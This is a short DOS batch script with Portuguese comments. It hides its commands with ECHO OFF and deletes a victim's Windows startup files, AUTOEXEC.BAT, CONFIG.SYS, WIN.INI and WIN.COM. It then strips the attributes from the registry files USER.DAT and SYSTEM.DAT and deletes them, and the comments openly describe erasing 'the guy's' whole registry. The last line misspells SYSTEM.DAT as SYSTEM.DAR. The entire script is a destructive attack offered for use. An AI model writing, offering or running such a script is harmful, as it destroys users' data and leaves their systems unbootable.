   @ECHO OFF                ; Desliga o ECHO, assim ninguém
                              ; vê os comandos que estão sendo
                              ; dados
     DEL C:\AUTOEXEC.BAT      ; Apaga o autoexec.bat
     DEL C:\CONFIG.SYS        ; Apaga o config.sys
     DEL C:\WINDOWS\WIN.INI   ; Apaga o win.ini
     DEL C:\WINDOWS\WIN.COM   ; Apaga o win.com
     ATTRIB -R -S -H +A USER.DAT SYSTEM.DAT
     DEL USER.DAT
     DEL SYSTEM.DAR           ; Apaga todo o registro do cara
